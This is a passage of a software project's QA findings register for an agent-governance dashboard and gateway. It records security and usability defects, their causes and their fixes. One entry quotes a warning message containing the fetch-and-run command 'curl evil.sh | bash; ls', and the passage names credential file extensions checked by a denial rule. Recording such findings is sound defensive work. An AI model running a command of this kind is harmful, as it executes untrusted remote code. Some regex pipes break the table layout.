| **230–232**                                  | `mg/SESSION-LOG-2026-09.md` §2026-09-03; plain language in §5.94; instructions in `docs-notes/LINUX-INSTALL.md` §2c. **A different axis again: the machine.** The fork was installed on a clean VPS, the first time anybody followed the runbook on a computer that had never run any of it, and it found three defects in one evening, **none findable by reading**. **230**: the dashboard had not built since 2026-09-02, because a hand-maintained alias list missed the import finding 213 added, and `tsgo -p tsconfig.ui.json` resolves through tsconfig `paths`, a different mechanism, so a green typecheck stood in for a build that is not one of §4s six commands. **231**: `--with-node` left Node off `PATH`, so `openclaw` (a symlink to a file with a `#!/usr/bin/env node` shebang) could not run, while the installer already symlinked `openclaw` under a comment explaining exactly why that happens; fixed twice, the first fix omitting `corepack` and breaking the _second_ install rather than the first. **232 is upstreams**: `resolveSystemctlProcessEnv` skipped uid 0 when filling a missing `DBUS_SESSION_BUS_ADDRESS`, so `daemon install` reported a unit file missing that was present. See `old-docs/UPSTREAM-BUG-REPORT.md`. **The shared finding: the path a new operator actually takes was the path nobody had walked to the end. A runbook is only tested by a cold machine**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **233–238**                                  | `mg/SESSION-LOG-2026-09.md` §2026-09-03 (later); plain language in §5.95; sweep write-ups in `REMAINING-WORK.md` §"A twelfth sweep" and §"A thirteenth sweep". **Two sweeps and one document conflict.** The conflict came first and was the most productive: §1 recorded finding 221 fixed and §4 still called the gate red, so the gate was run, and **233** is that `node scripts/run-lint.mjs` **could not complete on Windows at all**, spawning stylelint through the extensionless `node_modules/.bin` shim, which `spawnSync` cannot execute without a shell; it died after every oxlint shard passed, so its CSS hygiene step had never once run. **237** is the larger half: five registers describe that command as "what `git-hooks/pre-commit` runs", and **the hook runs `oxfmt` and plain `oxlint` over staged files and nothing else**. The narrow invocation finding 221 exists to distrust. Nothing automatic enforces the type-aware rules, `scripts/`, or the CSS check. **236** is finding 221 recorded fixed in one place and left live-and-"open" in five others. **234 and 235 are the sweeps** and both are **latent cross-organisation defects**. Reproduced with the multi-organisation test switch, not reachable on a shipped installation, which caps at one organisation (2026-08-30). They are fixed because that cap is recorded as "a product decision rather than a security boundary" alongside the claim that M5's isolation is "untouched and still enforced", and in these two places it was not. **234**: `governance set-policy-authoring` was the one account command that took the caller's permission and dropped their organisation, writing to any account on the installation and then rewriting its live session whether or not the write succeeded; its HTTP counterpart refuses the same request. **235**: the prompt-run table is module-level and installation-wide, and its two readers scoped it with `canManageAgent`, which `hasUnlimitedAgentScope` makes unconditionally true above the User tier, **finding 139 exactly, on a second registry**, in the one place `listActiveSessions` had not reached. Both CLI commands over it also claimed a User tier floor in a comment and passed `() => true`, and the route's comment promised "the scope check that follows" where none followed. **238** is the largest of the six and came from the sweep's documentation axis: `CLI-REFERENCE.md` says in one place that there is "deliberately **no** `governance agent cancel` command" because the in-flight table "lives inside the process running them", and documents that very command in two others. The prose was right about the mechanism, the table is a module-level `Map`, measured as per-process, so both `agent runs` and `agent cancel` are blind to every run the **Gateway** is executing, and `cancel` reported "no run is in flight" about live runs. **Every test of the pair asserted the empty case, which is the only case they can reach.** Made honest; whether the CLI should reach the Gateway's runs is T51. **The shared finding: a control that is described rather than measured is a control nobody has checked, and that holds for the checking machinery itself**                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **239-240**                                  | `mg/SESSION-LOG-2026-09.md` §2026-09-04; plain language in §5.96. **A fifth axis: an operator using it.** Kinan signed in as Root on the VPS and tried to create an agent. Both findings are invisible to every check this project has, because neither is about what the code computes. **239**: the create-agent form offered no way to name an owning Administrator, so Root filled it in, pressed the button and was correctly refused with nothing on screen to act on. The route has accepted `adminId` since M6 and the CLI has had `--owner` for as long; the panel's own props even carried `administrators`, annotated "for Root's owner picker", and no picker existed. That is the **fourth** time this project has shipped a working route with no affordance, and the file it happened in is the one whose header states the rule: "a capability is finished when something an operator can click uses it, not when the route returns 200". Fixed with a dropdown, a "First create an Administrator account in Accounts" prompt when the organisation has none, and a disabled button until an owner is chosen. **240**: placeholders were clipped mid-word and the "Create account" button rendered outside the visible edge. One cause: `.settings-row__control` centres and refuses to wrap, which is right for the short controls the settings surface was built for and wrong for the governance panels, where centring in a **column** shrank every input to its default `size` attribute. Fixed in two halves that are both needed: widen where there is room, and give any clipped box a hover tooltip where there is not. The tooltip measures text against the element's computed font with a canvas, because `scrollWidth` reflects the **value** and the string being clipped is the **placeholder**, so an empty input never reports overflow. Pinned in real Chromium (jsdom reports every width as zero, which is finding 224's trap) with a deliberate **fits-or-is-labelled** disjunction, and verified by mutation. **The shared finding: three consecutive days, and each day's best findings came from somewhere other than reading the code. A cold machine, then the checking machinery, then a person using the screen**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| **241–250**                                  | `mg/SESSION-LOG-2026-09.md` §2026-09-04 (later). **A sixth axis: the page measured rather than read.** Kinan reported seven layout complaints in one message; nine findings came out of them and a tenth explains why none could have been caught. **250 is the finding**: `governance-textbox-fit.browser.test.ts`, the one test in this project that can see layout, **is inside the documented verification command and skips silently every time**. It is collected there through the root vitest config, which is jsdom, where every width is zero, so its own `skipIf` guard turns it off, the default reporter prints `2 skipped`, and the run exits `0`. It executes only under the ui package's `--project browser`, which needs Playwright's Chromium, and `ms-playwright` has never existed on the development machine, so **no `.browser.test.ts` in this repository has ever run here**. Finding 203's shape one config over, and the fifth instance of this project's central pattern after T25, T19, T29 and findings 136 and 137. **It explains the day**: finding 240 was fixed on 2026-09-03 with a test written into that very file, the test could not run, and the same class of defect was reported the next morning — and the assertion it added measured the wrong edge, `document.documentElement.clientWidth` rather than the `.settings-group` that actually clips. **248 is the most serious of the nine**: the design system defines `.btn.primary` and `.btn.danger`, and the governance panels used four spellings of neither across twenty call sites, so measured in Chromium "Delete" computed byte-identical to a plain button. On a security console that is not cosmetic: deleting an account, deleting the organisation, switching off a shipped core denial, rejecting a request and stopping an agent all looked exactly like "Who does this affect?". **249 and 250 are permission-model defects, both in the safe direction**: the dashboard never read `canAuthorPolicy`, so T27's withhold switch was invisible and a withheld User was shown the whole authoring surface; and three posture controls kept the User gate after finding 218 raised their routes to Administrator. **241–244 and 246 are one family**: the page had no section spacing because `settings.css` separates sections with child selectors and this page nests them two levels down; a nested `.settings-row__control` sized to max-content and was clipped by `overflow: hidden`, which is four of the seven complaints; the page was never marked `wide` despite a 13.5rem jump-nav; both explanatory disclosures had no CSS at all; and the ledger put five controls in a header slot sized for one. **245**: two hint classes used at six call sites and defined in no stylesheet. **247**: the self-protecting core rules rendered nothing where the switch would be, so a deliberate design decision read as a page that had failed to render. **The method to reuse is in the session log**: mount the light-DOM page in a dev server against a stub, drive it at every tier and state, and _measure_ every element against the card that clips it; then difference the class names the templates emit against the class names the stylesheets define, which is what found 245 and 248                                                                                                                                                                                                                                                                                                                                                                                                   |
| **251–252**                                  | `mg/SESSION-LOG-2026-09.md` §2026-09-04 (later still). **Found by finding 250's fix, within a minute of the browser tests being able to run at all.** Playwright's Chromium was installed and every `.browser.test.ts` in the repository executed for the first time: **22 files, 192 tests, all passing**. The governance layout file failed twice on that first run and both failures were real. **251, and it is the larger:** `rootState()` in `governance-textbox-fit.browser.test.ts` had no `policy`, and `renderPolicySection` returns early without one, so **the largest section of the page had never been on the page these layout assertions measured** — the rule list, its filter, the authoring form, the folder-grant panel and the Codex panel. Every defect the file exists to catch could have been sitting in it. Caught by the new disclosure assertion's own "did I find anything to test?" guard, which is the argument for writing assertions that way and is the same guard the first test in the file has always used. **252:** with a policy on the page the authoring form appeared, and "Minutes (blank = never expires)" measured clipped with no hover fallback — visible in the screenshot Kinan sent that morning as "Minutes (blank = r", beside "Agent id (blank = all ager". **Both halves of finding 240's fix were defeated on those two fields at once.** Widening could not happen: both carried inline `max-width` caps of 9rem and 11rem, chosen when the page body was ~490px and widening one pushed the Add rule button off the edge — a layout that no longer exists now the page is `--wide` and the cluster wraps. Labelling could not happen either: `applyOverflowTitle` correctly never overwrites an authored `title`, and the lifetime field has one, so the fallback declined and the field got neither treatment. Fixed by removing both caps and giving fields inside a stacked cluster a `31ch` floor, which is what those placeholders need — the general `24ch` is about 168px against roughly 190px required, so they were clipped even with the caps gone. **The residual is recorded rather than fixed:** an input carrying both an authored hint and a clipped placeholder still gets no placeholder tooltip; harmless here because `ttlHint` states exactly the part being cut off, but the general answer if it recurs is to append rather than decline. **Alongside these, a feature sweep drove six features rather than reading them** (`docs-notes/qa-sweep-2026-09-04/feature-sweep.ts`): twenty checks, twenty passed, two of them adversarial. The ledger was **edited on disk** — one `deny` flipped to `allow` — and detected at #6 by content hash; then restored and **truncated by one line**, which a chain alone cannot see, and detected by the checkpoint. Finding 225 was re-run as the attack it describes: five failures lock an account out, then 3,000 invented usernames failed to evict that lockout. Also confirmed working end to end: the one-Root cap inside the write lock, case-insensitive sign-in, the permission model at all four tiers including a withheld User, ten core denials in force on a fresh install, T24's split tier in both directions, a kill switch written `Scout` and stored `scout` (finding 202's mechanism), and a rule request that refuses a second decision. **One sweep check failed first time and it was the probe, not the product**: `decideRuleRequest` takes a params object, so the id never arrived and it returned `undefined` — silently, which is right for an idempotent decide and is also exactly the shape that hides a real defect, so the fix turned one check into two |
| **253**                                      | `mg/SESSION-LOG-2026-09.md` §2026-09-04 (night); reproduced by `docs-notes/qa-sweep-2026-09-04/gate-sweep.ts`. **A folder grant on an absolute path writes two rules that match nothing, and shows them to the operator as confirmation.** `FolderGrantInput` carries a `cwd` field documented as "Workspace root, so a relative path normalises the way the gate will read it", and **neither production caller passes it** — not `governance-dashboard-folder-grant.ts`, not `register.governance.policy.ts`. So the grant normalises against the **process** cwd (wherever the Gateway or the operator's shell happens to be) while the gate normalises against the **agent's** workspace from `HookContext.cwd`. The grant writes `^C:/…/projects/secrets(/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | $)`; the gate asks about `projects/secrets/prod.key`; neither the allowance nor the exception binds. **The module's own header states the invariant this breaks**: "Paths are normalised through the same function the gate uses, so what an operator types and what the rule matches cannot disagree." They can, because that function takes a second argument that decides the answer and nothing supplies it — **a parameter that exists precisely to keep two halves in agreement, with no caller passing it**, which is the shape of finding 239 and of the type-level guard once written into a test file. **Worse than an ordinary silent failure**, because the panel lists the two rules back under "Written as separate rules:", a display added so that "these are ordinary rules" is demonstrated rather than claimed: here it demonstrates a protection that is not in force, so the operator gets an authoritative-looking confirmation of nothing. **Relative paths work correctly**, which is both the mitigation and the reason it survived: the form's placeholder asks for one ("e.g. src"), the tests use one, and `work`+`work/secrets`behaves exactly as T32 promises. **Not fixed, deliberately**: the correct`cwd` at grant time is a product decision, because a _global_ grant binds agents with different workspaces and has no single root to normalise against, so the choice between resolving per agent, refusing an absolute path at authoring time, and making the pattern position-independent the way the core rules are is **T54**. Pinned in the sweep as a check that asserts the _current_ behaviour and says so in its name, so a fix turns it red rather than leaving a silent pass. **Found by granting a folder and then asking the gate whether the exception held** — not by reading the module, which has been read several times and is careful and correct about everything else |
| **254**                                      | `mg/SESSION-LOG-2026-09.md` §2026-09-04 (late); demonstrated by `docs-notes/qa-sweep-2026-09-04/relocated-governance-dir.ts`. **SECURITY. A core denial Root cannot switch off matched nothing, and the four files it protects were readable by the governed agent.** `governanceStateRules()` derives a denial on _the governance directory in use_ from the live `OPENCLAW_GOVERNANCE_DIR` on every load, so relocating the store moves the protection with it. It derives it as an **absolute** pattern, under a comment stating the assumption it rests on: “absolute whenever the target is outside the workspace, **which the governance directory always is**”. It is not always. Relocate the store to a path inside an agent's workspace — a configuration this project ships a deployment-report field for, `governanceDirRelocated` — and the paths normalise workspace-**relative**, so the absolute pattern binds nothing. The static sibling does not cover it either: that one is `(^                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | /)\.openclaw/governance(/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | $)`and a relocated directory is by definition not at that path. **Measured with the fix removed and restored**:`policy.json`, `users.json`, `audit-ledger.jsonl`and`ledger.key`all read ALLOWED before, REFUSED after. Reading`ledger.key`defeats requirement 8 outright, because the whole chain can be forged with it; the credential-file fallback does not catch it, listing`.pem`, `.pfx`, `.p12`and`.keystore`and not`.key`. **Narrow but real**: the default layout is safe because the static pattern covers it. **Found while fixing 253, not while looking for it** — twelve tests went red the moment both spellings were matched, and the cause was not the fix but three fixtures using the governance directory _as the agent's workspace_, which no installation does and which was harmless only while the rule was inert. Fixed by the same change as 253 and by giving those fixtures a workspace of their own |
| **255**                                      | `mg/SESSION-LOG-2026-09.md` §2026-09-04 (last); found by `docs-notes/qa-sweep-2026-09-04/surface-parity.mjs`. **A three-surface parity sweep, and the register of deliberate omissions was caught _claiming_ a capability rather than omitting one.** The sweep differences the 46 route-and-method pairs the Gateway serves against what the dashboard calls and what the CLI registers. Nine candidate gaps, **four false positives** (dashboard calls carrying a query string — the caveat the earlier capability sweep recorded, repeated at the top of the script for that reason), and **four of the five real ones already answered** by `CLI-REFERENCE.md` §2d, which records creating, deleting, re-roling and password-resetting an account as deliberately dashboard-only on a real argument: the dashboard's account form carries guards QA rounds put there, and a second implementation is where two surfaces drift. **255 is the fifth, in three parts.** (1) **Listing** accounts had no command and no stated reason — and its absence made §2d wrong in the worse direction: that section's "what you can still do from here" named `governance set-policy-authoring`, which takes an `<userId>`, and **nothing on this surface could print an account id** (`organisation summary` gives counts and the Root's username, `agents access` gives usernames). A document existing to name the consolation for missing capabilities was offering one that could not be completed without the dashboard. **Finding 223's shape one layer in**: not a register omitting a reason, but a register claiming a capability while it was unreachable. Built as `governance accounts`, Root-only and group-scoped exactly as `GET users` is, id first. Listing carries none of the divergence cost the register's argument rests on: no confirmation field, no password rule, no role picker the server would refuse — it is a read. (2) **The host resource view** is dashboard-only and correctly so — `uptime`, `free` and `top` answer it better on a shell — but had no entry in the register that promises to name every such case, so it read as a gap; §2d's capability count goes from two to three. (3) **The sweep's own tooling twice over-reported**, and both were fixed rather than lived with: it was method-blind, so mapping `users` to the new `accounts` command marked create-and-list reachable when only list was; and it matched bare command leaves, so `users/delete` showed green against `organisation delete`, which removes the whole organisation. **A parity checker that reports a false green is worse than none — it tells you to stop looking**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **256–325**                                  | `mg/REMAINING-WORK.md` §"Where this file's findings stop, and where 241–304 are", which maps each finding or group to its section of `mg/SESSION-LOG-2026-09.md` (2026-09-05 to 2026-09-08 (vi)); plain language in `docs-notes/QA-IN-PLAIN-TERMS.md` up to §5.103. **The axes that produced them:** time and lifecycle, bounds and contention, an operator using the dashboard, composition, the command line's removal audited from outside, and the dashboard driven section by section from all four tiers                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **326–341**                                  | `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` §"Where this pass got to" (one row per finding) and `mg/SESSION-LOG-2026-09.md` §"2026-09-08 (vii)" to §"2026-09-09"; plain language §5.104; design §3.5.78. **The last nine dashboard sections driven from all four tiers**, including 338, a section no earlier pass had rendered, and 339, every refusal on the page reported off-screen                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| **342–344**                                  | `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` §"2026-09-09 (ii)"; plain language §5.105; design §3.5.79. **The project's records audited against its commands:** a reason recorded twenty-fold wrong, backlog rows stale against other rows, and a check recorded as passing that was failing                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| **345**                                      | `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` §"Finding 345"; plain language §5.105; design §3.5.79. **27 Control UI tests failing, all pre-existing, in an area no documented command runs.** Recorded, then diagnosed on 2026-09-13 (A10): 19 were the fork's own after all, 3 were Windows paths, and those 22 are fixed; 5 are a jsdom limitation in files the fork never touched                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **281, 316 closed**                          | `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` §"T60 and T63 built"; plain language §5.107–§5.108; design §3.5.81–§3.5.82. Closed 2026-09-11 when T60 and T63 were built, including a concurrency regression found and fixed while finishing them                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| **346–363**                                  | `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` §"The dashboard QA pass (2026-09-12 and 13)"; plain language §5.109–§5.110; design §3.5.83. **The dashboard driven through a browser, from every tier, under failure.** **346 is security**: the Control UI's service worker stored every governance answer and served it, whenever the Gateway did not answer, to whichever account was signed in; a Viewer was served Root's accounts list, and sign-out removed nothing. **347**: an escalation from a dashboard prompt had never reached a person. Upstream's attended-run gate refused it, and it was recorded as a timeout that never happened; **348** recorded every withdrawn escalation the same false way. **349**: Escape on any Settings confirmation left Settings. **350–354** made T63's claim true, because closing the tab had been cancelling the task T63 exists to recover (Kinan decided that tasks survive the tab). **355–361** are what the page said, where it said it, and whether it was true. **362**: a rule request's reason was cut to 500 characters with no refusal and no mark. All eighteen fixed and mutation-checked. **363** was fixed later on 2026-09-13, at Kinan's decision (T69): a task cancelled while its approval card was up left the card pressable until it expired, so the approval hook now withdraws its approval through a new `plugin.approval.withdraw` method, the card closes, and a chat channel is told the request was cancelled. **T68**, decided and built the same day: a dashboard prompt's escalation is seen and answered only by the governance accounts that manage its agent, on the governance page, and recorded under that account; the page clears its cards when the account is demoted or its read is refused, a stale-card defect found while finishing it                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **364**                                      | `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` §"Finding 364"; plain language §5.110; design §3.5.83. **Security, design requirement #7.** Found on 2026-09-13 by the week's QA check, composing T68 with the kill switch: the kill switch never stopped a dashboard prompt, because those runs are not in the Gateway's run registry, and an escalation raised before the lock stayed answerable, so "Allow once" could run an action on a locked agent. Lockdown now ends the agent's prompts (ending `kill-switch`, confirmed once they unwind), which withdraws the approval, and the answer route refuses an allow for a locked agent                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| **365**                                      | `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` §"A11 built"; plain language §5.111; design §3.5.84. **Found and fixed 2026-09-13 while building A11**, by a probe through the real routes before any code changed. A User's agent-setting request for a `mode` of `off` was accepted, and approving it answered 200, marked the request approved, wrote `agentMode: { <agent>: "off" }` to `policy.json` and _"posture default -> off"_ to the ledger, while the loader, which keeps only `enforce` and `monitor`, discarded the value on the next read. The gate never changed, so it failed safe; the tamper-evident trail recorded a posture change that did not happen. `policy/agent-mode` had refused a per-agent `off` at every tier since T4, and approval reached `setAgentMode` without that route. Now refused at submission, refused at approval **before** the decision is claimed (so a request stored earlier leaves no "approved" entry), and refused by `setAgentMode` itself (`PER_AGENT_OFF_REFUSED`). **A11 was built with it**: the dashboard files agent-setting requests, a path request states its direction, and the queue row shows it                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **366**                                      | `mg/REMAINING-WORK.md` §"Documents 7–9 and the QA over the last week"; plain language §5.112; design §3.5.85. **Found and fixed 2026-09-14 by the QA over the last week, composing T55 with the request queue.** Deleting an agent from the host clears what its id carried (T55), and left its pending rule and agent-setting requests in the queue. A probe through the real deletion and the real decide route: an Administrator approved both, **200 and 200**, and the policy then held an allow rule on `/srv/payroll/.*` and a monitor posture for an id no longer registered, for whichever agent is registered under that name next. PERMISSION-SPEC §8 already said a decision requires the request's agent to be in the organisation; the route did not check it. Now approval is refused with 409 `agent_not_registered` **before** the decision is claimed, so no "approved" entry is written; the queue marks such a request `agentRegistered: false`, and its row says so and offers only Reject                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **367**                                      | Same record; plain language §5.112; design §3.5.85. **Found 2026-09-14 rewriting `docs-notes/T47-TEST-PLAN.md` against the code, and proved by its regression tests before the fix.** Root could switch a core denial off from the Policy section and nothing could switch it back on: the loader drops a switched-off core rule from the rules it returns, the policy read carried only its id, and the only call to `setCoreRule` passed `false`. Since the command line was removed on 2026-09-07 the one way back was hand-written HTTP, while the deployment report's remedy said to switch it back on in the Policy section. Now the read carries the switched-off rules whole (`switchedOffCoreRules`), and the Policy section names each one to every tier, with **Switch on** for Root                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **368**                                      | Same record; plain language §5.112. **Low. Found the same way.** Five failed sign-ins lock a username out for fifteen minutes, and the refusal said only _"Try again later."_ The wait travelled in a `Retry-After` header the page does not read. The refusal now says _"Try again in 15 minutes."_; the header already disclosed the wait, so nothing new is revealed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| **Review closed, 2026-09-13 (not numbered)** | `mg/REMAINING-WORK.md` §"The independent review, checked item by item"; plain language §5.113; design §3.5.86. **Five repairs made while closing `Kimi_QA_1.md`**, recorded against the review on the day rather than given finding numbers. **Lock down** in the kill switch acted on one click while **Stop**, which locks the same agent the same way, asked first; it now asks and names the agent. **Bug 8**, at Kinan's decision: an indefinite rule added beside an identical temporary one silently made the grant permanent; it is now a clash kind of its own, `extends-time-limited`, headed as an extension, and the ledger entry for the new rule names the temporary rule it extends. **The approval gap**: authoring warned about an unanchored pattern, and approving a User's rule request, which is what creates the rule, warned nobody; a pending request now carries the warnings and clashes approving it would produce (`withApprovalPreview`), shown under "If this is approved". **A false warning**: `^src(/\|$)`, the shape the folder-grant form writes, was warned as unanchored with a message about `curl evil.sh \| bash; ls`; a path rule's trailing `(/\|$)` now counts as its end anchor. **A stale remedy**: the deployment report told Root to run the removed `governance policy core-rule <id> true`; it names the Policy section, which finding 367 made true. **Open question for the register:** the false warning and the stale remedy are the shape of findings 285 and 355–361, which carry numbers                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **369**                                      | `mg/REMAINING-WORK.md` §"The QA over three days"; plain language §5.114; design §3.5.87. **Found 2026-09-14 while checking §5 of this file against the code.** Setting one agent's posture has been Administrator-level since T4, and the Policy section hid its control below Administrator, but the _Active agent sessions_ row still drew **Observe** for any account that may stop the agent, a User included, and `policy/agent-mode` refused every press. The row now draws it from Administrator up (`active-sessions-panel.ts`). A control whose only outcome is a refusal, the shape of findings 197, 247 and 249–250                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **370**                                      | Same record; plain language §5.114; design §3.5.87. **Found 2026-09-14 by composing finding 366 with every other store keyed by an agent id.** 366 refused approval of a request whose agent had been deleted, but only while the id stayed unregistered: once a new agent was registered under the same name, the old request was approvable for it. Two more stores had the same hole with no check at all: a dashboard escalation raised for the deleted agent became answerable again, so "Allow once" could run the deleted agent's action as the new one, and a held decision in _Awaiting your decision_ could be allowed, filing a rule proposal for the new agent. All three proved by tests driving the real deletion (`deprovisionAgent`) and the real routes before any change. Now one test decides all three, `registrationPredates` in `agent-registry.ts`: the registration under the id must be older than the question. A stale request is marked and cannot be approved, a stale escalation is not listed and answers 404, and a stale held decision cannot be allowed; rejecting and denying stay open                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **371 (accepted)**                           | Same record; plain language §5.114. **Low. Found 2026-09-14 while checking §3 of this file against the code.** Accounts written before organisations existed (M3) cannot sign in, and the only thing that removed them was `governance groups migrate --delete`, which went with the command line on 2026-09-07; `deleteUnmigratedAccounts` has had no caller since, while this file and `CHAPTER3-MATERIAL.md` said the Accounts panel removes them. The documents and the stale code comment in `authenticate` are corrected. No installation in use can hold such an account (the VPS was set up after M3), so whether to build a Root control is a decision, and on 2026-09-15 Kinan accepted it (C14, option b), so it is closed with nothing built                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
